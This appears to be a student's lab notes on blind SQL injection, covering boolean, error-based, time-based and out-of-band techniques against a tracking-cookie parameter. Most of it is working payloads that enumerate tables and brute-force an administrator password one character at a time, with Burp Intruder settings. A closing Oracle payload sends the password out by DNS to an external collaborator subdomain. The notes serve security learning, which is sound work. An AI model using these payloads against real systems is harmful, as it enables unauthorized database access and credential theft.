--- ---

Type of SQL Injection (Blind) & Witch one to use (Depending on situation)
	- Equality Check                ---> Response show an element on the HTML page (Welcome Back)
	- Concatenation                 ---> Response from query can return 200 and 500 responses
	- Time Base                        ---> No response change in the request (Always 200)

**All SQL Injection demonstrated in the following example can be use the find a vulnerability in cookies**

Check each query type depending on the DB type [HERE](Cheat Sheet ---> https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## Equality Check Technique

Steps
- Prove parameter is vulnerable
- Find Tables
- Find Column Name ??? (Review)
- Find Variables in a Column
- Length of Variable (>,<,<=,>=)
- Enumeration of variable (abc...)

Example Cookie Request
![[Screenshot from 2022-12-05 18-45-22.png]]

Prove the TrackingID is vulnerable
```
' (error) & '' (back to normal)


```

The SQL request (Complement of prouving the TrackingID is vulnerable)
```
select tracking-id from tracking-table where trackingId = 'wQzpcksV9nxMDwHH'
```
- In this example, if the tracking id is true, it will return on the page "welcome back" (This will be our True and False statment that will help us determine if the SQL injection request we are doing is working or not working)

	- In simple terms (If this tracking id exists -> query returns value -> Welcome back message)
	- ---> ( If the tracking id don't exist -> query returns nothing -> no Welcome back message)
		- TRUE -> Welcome back             ---> (wQzpcksV9nxMDwHH' and 1=1--')
		- FALSE -> no Welcome back       ---> (wQzpcksV9nxMDwHH' and 1=1--')


Find Table (Try and Errors)
```
wQzpcksV9nxMDwHH' and (select 'x' from TABLE_NAME LIMIT 1)='x'--'
```

- TABLE_NAME         ---> Table we are looking to see if exist (try an error)
- LIMIT 1                    ---> Only mean that we want 1 output (We dont want mutiples x in query)

- 'x' act has a dummy variable (simply mean if the TABLE_NAME exist, then make the qury = x) If the table exist then 'x' = 'x'-- (True Statement ---> Display default message)


**Find Column Name ???**
```

```


Find a Variable in a Column
```
wQzpcksV9nxMDwHH' and (select Column_Name from Table_Name where Column_Name_same_has_the_other_one='administrator')='administrator'--'
```

- Column_Name                     ---> The Column Name that we are looking to get the variable
- Table_Name                         ---> Table Name that we are interested in (see previous step)
- Column_Name_same...        ---> Same Column Name has the one selected
- administrator                       ---> Variable we are looking to find (True = Default HTML Resp)


Length of Variable (ex: password of administator account)
```
wQzpcksV9nxMDwHH' and (select Column_Name from Table_Name where Column_Name_same...='administrator' and LENGTH(password)>20)='administrator'--'
```

- Column_Name                    ---> The Column Name that we are looking to get the variable
- Table_Name                        ---> Table Name that we are interested in (see previous step)
- Column_Name_same...       ---> Same Column Name has the one selected
- administrator                       ---> Variable we are looking to find (True = Default HTML Resp)
- password                             ---> Second Column (looking length variable for user administator)

- <,>,>=,<=
- Possible also to change the number to determine the length of the variable


Enumeration of Varaible (ex: password of administator account)
```
wQzpcksV9nxMDwHH' and (select substring(Column_Name_PASSWORD,2,1) from Table_Name where Column_Name='administrator')='a'--'
```

- Column_Name_PASSWORD  ---> The Column we are interested to enumerate
	- (Column_Name_PASSWORD,2,1)  ---> 2,1 (2 = character we are trying to guest, 1 = Length of the letter (a) we are trying to guest... (probably always 1.. we guest 1 letter at the time))
- Column_Name                        ---> The Column Name that we are looking to get the variable
- Table_Name                            ---> Table Name that we are interested in (see previous step)
- Column_Name_same...           ---> Same Column Name has the one selected
- administrator                           ---> Variable we are looking to find (True = Default HTML Resp)

- BurpSuite
	- Proxy the request
	- Send the request to intruder and add the § between the number after Column_Name_PASSWORD and between the letter we are tying to guest (a)
	```
	wQzpcksV9nxMDwHH' and (select substring(Column_Name_PASSWORD,§2§,1) from Table_Name where Column_Name='administrator')='§a§'--'
	```
	- Set the attack to Cluster Bomb and load the payloads

---

## Concatenation Technique

Steps
- Prove parameter is vulnerable
- Find Tables
- Find Column Name ??? (Review)
- Find Variables in a Column
- Length of Variable (>,<,<=,>=)
- Enumeration of variable (abc...)

Example Cookie Request
![[Pasted image 20221206184026.png]]

Prove the TrackingID is vulnerable
```
' (error) & '' (back to normal)

' || (select '' || '                     ---> Not Working (Try other database synthax)

' || (select '' from dual) || '          ---> oracle database (True)

' || (select '' from dualfiewjfow) || '  ---> error (False)
```

||                         ---> Simply mean to the query that a new query will be made in the same query


Find Table (Try and Errors)
```
' || (select '' from TABLE where rownum =1) || '
```

rownum                ---> Assure it will only output 1 entry (similar to the LIMIT 1 in Equality Check)
TABLE                   ---> Table we are interested to test (If exist)


**Find Column Name ???**
```

```


Find a Variable in a Column
```
' || (select '' from TABLE where COLUMN='administrator') || '   ---> NOT GOOD

' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM TABLE where COLUMN='administrator') || '                                    ---> (True = Error)

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM TABLE where COLUMN='fwefwoeijfewow') || '                                   ---> (False = 200)
```

1st Query (NOT GOOD)           ---> This query does not work since a false or true response will always display a 200 response (And might not display a HTML code that allow us to verify)
		This then mean we need to use a query to will response a error code when the query is valid and a 200 response when the query is false

CASE WHEN                             ---> Verify if the query is true are not (user exist or not)
THEN TO_CHAR(1/0)                ---> Create an Invalid query (1/0 = Invalid)
ELSE                                          ---> If response is False (user don't exist, else respond '' -> 200)
TABLE                                        ---> Table we are interested in
COLUMN                                   ---> Column we are interested in

This mean that if the user is found, it will not return an error, and if it is not found it will prive an invalid statment

**Take also note that the query is been read from (FROM users -> to the right and after pass the CASE WHEN query part)**


Length of Variable (>,<,<=,>=)
```
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM TABLE where COLUMN='administrator' and LENGTH(password)>19) || '
```

200 response                              ---> False
500 response                              ---> True

Enumeration of variable
```
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM TABLE_NAME where COLUMN='administrator' and substr(COLUMN_NAME_PASSWORD,2,1)='a') || '
```

- Column_Name_PASSWORD  ---> The Column we are interested to enumerate
	- (Column_Name_PASSWORD,2,1)  ---> 2,1 (2 = character we are trying to guest, 1 = Length of the letter (a) we are trying to guest... (probably always 1.. we guest 1 letter at the time))
- Column                                    ---> The Column Name that we are looking to get the variable
- Table_Name                            ---> Table Name that we are interested in (see previous step)
- administrator                           ---> Variable we are looking to find (True = Default HTML Resp)

- BurpSuite
	- Proxy the request
	- Send the request to intruder and add the § between the number after Column_Name_PASSWORD and between the letter we are tying to guest (a)
	```
	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM TABLE_NAME where COLUMN='administrator' and substr(COLUMN_NAME_PASSWORD,§2§,1)='§a§') || '
	```
	- Set the attack to Cluster Bomb and load the payloads

---

## Time Base Technique

Steps
- Prove parameter is vulnerable
- Find Column Name ??? (REVIEW)
- Find Tables
- Length of Variable (>,<,<=,>=)
- Enumeration of variable (abc...)

Example Cookie Request
![[Pasted image 20221206184026.png]]

Prove Vulnerable parameter
```
'                                         ---> Not Working with time base injection

' || (SELECT pg_sleep(10))--              ---> Return 10 seconds delait
```

||                           ---> Simply mean to the query that a new query will be made in the same query

- Try multiples type of DB query on the injection to see if it's vulnerable [CHEAT SHEET](Cheat Sheet ---> https://portswigger.net/web-security/sql-injection/cheat-sheet)
	- ex: pg_sleep
	- SLEEP
	- ...


**Find Column Name ???**
```

```


Find Tables
```
' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--

' || (select case when (COLUMN='administrator') then pg_sleep(10) else pg_sleep(-1) end from TABLE)--
```

CASE WHEN                             ---> Verify if the query is true are not (user exist or not)
(1=0) or (1=1)                            ---> Testing query for True and False query
ELSE                                          ---> If response is False (user don't exist, else respond '' -> 200)
TABLE                                        ---> Table we are interested in
COLUMN                                   ---> Column we are interested in


Length of Variable
```
' || (select case when (COLUMN='administrator' and LENGTH(COLUMN_password)>20) then pg_sleep(10) else pg_sleep(-1) end from TABLE)--
```

Burpsuite Testing
	- Create new ressource pool when bruteforcing length with 1 threat (10 wont allow the reply time to responde and be captured by BurpSuite)
	- Also when launching attack add a column for response time (Response Received)


Enumeration of variable
```
' || (select case when (COLUMN='administrator' and substring(COLUMN_password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from TABLE)--
```

- Column_Name_PASSWORD  ---> The Column we are interested to enumerate
	- (Column_Name_PASSWORD,2,1)  ---> 2,1 (2 = character we are trying to guest, 1 = Length of the letter (a) we are trying to guest... (probably always 1.. we guest 1 letter at the time))
- Column                                    ---> The Column Name that we are looking to get the variable
- Table_Name                            ---> Table Name that we are interested in (see previous step)
- administrator                           ---> Variable we are looking to find (True = Default HTML Resp)

- BurpSuite
	- Proxy the request
	- Send the request to intruder and add the § between the number after Column_Name_PASSWORD and between the letter we are tying to guest (a)
	```
	' || (select case when (COLUMN='administrator' and substring(COLUMN_password,§1§,1)='§a§') then pg_sleep(10) else pg_sleep(-1) end from TABLE)--
	```
	- Set the attack to Cluster Bomb and load the payloads

**(IMPORTANT)** Burpsuite Testing
	- Create new ressource pool when bruteforcing length with 1 threat (10 wont allow the reply time to responde and be captured by BurpSuite)
	- Also when launching attack add a column for response time (Response Received)

---

## Out-of-Band

Steps
- Try DNS lookup
- Try DNS lookup with data exfiltration

Example Cookie Request
![[Pasted image 20221206184026.png]]

DNS Lookup (Example with Oracle DB) ---> Other [Database](https://portswigger.net/web-security/sql-injection/cheat-sheet)
```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

UNION Query                 ---> SQL Vulnerability


DNS Lookup with Data Exfiltration (Example with Oracle DB) ---> Other [Database](https://portswigger.net/web-security/sql-injection/cheat-sheet)
```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--'
```

UNION Query                 ---> SQL Vulnerability
More information in the Cheat Sheet

The response request will be appended to the subdomain (example.ca ---> answer.example.ca)